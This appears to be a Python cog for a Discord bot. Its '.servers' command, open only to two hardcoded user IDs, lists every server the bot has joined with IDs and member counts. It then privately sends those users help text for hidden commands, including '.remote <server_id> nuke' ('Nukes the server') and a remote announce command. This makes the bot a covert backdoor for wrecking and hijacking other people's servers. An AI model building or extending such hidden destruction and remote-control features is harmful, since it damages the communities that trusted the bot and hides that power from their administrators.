import discord
from discord.ext import commands

ALLOWED_IDS = {960216572478246992, 976205015834325003}  # Only allowed users

def is_allowed_user():
    def predicate(ctx):
        return ctx.author.id in ALLOWED_IDS
    return commands.check(predicate)

class ServerList(commands.Cog):
    """Cog to list all servers the bot is in."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="servers")
    @is_allowed_user()
    async def servers(self, ctx: commands.Context):
        """Shows all servers the bot is in."""
        guilds = self.bot.guilds
        if not guilds:
            await ctx.send("Bot is not in any servers.")
            return

        # Create an embed for nicer formatting
        embed = discord.Embed(
            title="🤖 Servers I am in",
            color=discord.Color.green()
        )

        for guild in guilds:
            embed.add_field(
                name=guild.name,
                value=f"ID: {guild.id} | Members: {guild.member_count}",
                inline=False
            )

        await ctx.send(embed=embed)
        info_board = discord.Embed(
            colour=discord.Colour.blue()
        )
        info_board.add_field(name="nuke", value="Nukes the server. - .remote <server_id> nuke", inline=False)
        info_board.add_field(name="announce", value="Announce something in a remote server. - .remote <server_id> announce <channel_name_or_id> Your message here", inline=False)
        await ctx.author.send(embed=info_board)

async def setup(bot: commands.Bot):
    await bot.add_cog(ServerList(bot))
